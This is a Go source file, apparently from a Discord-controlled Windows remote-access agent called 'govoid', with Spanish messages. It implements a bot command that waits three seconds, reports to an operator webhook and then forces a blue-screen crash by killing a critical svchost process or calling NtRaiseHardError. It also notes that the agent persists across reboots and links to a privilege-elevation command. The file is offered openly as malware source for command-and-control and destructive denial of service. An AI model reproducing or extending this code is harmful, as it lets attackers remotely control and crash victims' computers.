//go:build windows

package commands

import (
	"fmt"
	"log/slog"
	"runtime/debug"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/local/govoid/internal/util"
	"github.com/local/govoid/internal/win32"
)

const bsodDelay = 3 * time.Second

func BSOD(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}

	if bsodDiagnosticRequested(i) {
		Finish(s, i, "🩺 Preflight BSOD (sin tocar nada)\n```\n"+win32.BSODDiagnostics()+"```")
		return
	}

	Finish(s, i, fmt.Sprintf(
		"💀 Pantalla azul en %s.\n```\n"+
			"proceso : svchost crítico (RpcSs → DcomLaunch)\n"+
			"bugcheck: CRITICAL_PROCESS_DIED (0xEF)\n"+
			"respaldo: NtRaiseHardError (0xC0000420)\n"+
			"disco   : sin escrituras forzadas\n"+
			"vuelta  : el agente reaparece al arrancar Windows\n"+
			"```\nSi el equipo no se reinicia solo, apágalo a mano.",
		bsodDelay))

	go func() {
		defer func() {
			if recovered := recover(); recovered != nil {
				slog.Error("bsod: panic", "panic", recovered, "stack", string(debug.Stack()))
				_, _ = s.FollowupMessageCreate(i.Interaction, true, &discordgo.WebhookParams{
					Content: fmt.Sprintf("❌ El bugcheck reventó el agente.\n```\n%v\n```", recovered),
				})
			}
		}()

		slog.Info("bsod: esperando", "delay", bsodDelay)
		time.Sleep(bsodDelay)

		slog.Info("bsod: aviso al webhook")
		notifyBSOD()

		slog.Info("bsod: disparando")
		method, err := win32.TriggerBSOD()
		if err != nil {
			slog.Error("bsod: falló", "err", err)
			_, _ = s.FollowupMessageCreate(i.Interaction, true, &discordgo.WebhookParams{
				Content: "❌ No se pudo provocar el bugcheck.\n```\n" + err.Error() + "\n```",
			})
			return
		}

		slog.Warn("bsod: terminó sin bugcheck", "metodo", method)
		_, _ = s.FollowupMessageCreate(i.Interaction, true, &discordgo.WebhookParams{
			Content: "⚠️ Terminado `" + method + "` sin bugcheck. Revisa el visor de eventos.",
		})
	}()
}

func BSODButton(s *discordgo.Session, i *discordgo.InteractionCreate) {
	BSOD(s, i)
}

func bsodDiagnosticRequested(i *discordgo.InteractionCreate) bool {
	if i.Type != discordgo.InteractionApplicationCommand {
		return false
	}
	data := i.ApplicationCommandData()
	for _, option := range data.Options {
		if option.Name == "diagnostico" && option.Type == discordgo.ApplicationCommandOptionBoolean {
			return option.BoolValue()
		}
	}
	return false
}

func ElevateButton(s *discordgo.Session, i *discordgo.InteractionCreate) {
	Elevate(s, i)
}

func notifyBSOD() {
	_ = util.PostWebhook("💀 Pantalla azul provocada", 15158332, webhookFields(
		util.EmbedField{Name: "accion", Value: "bugcheck CRITICAL_PROCESS_DIED", Inline: true},
	))
}
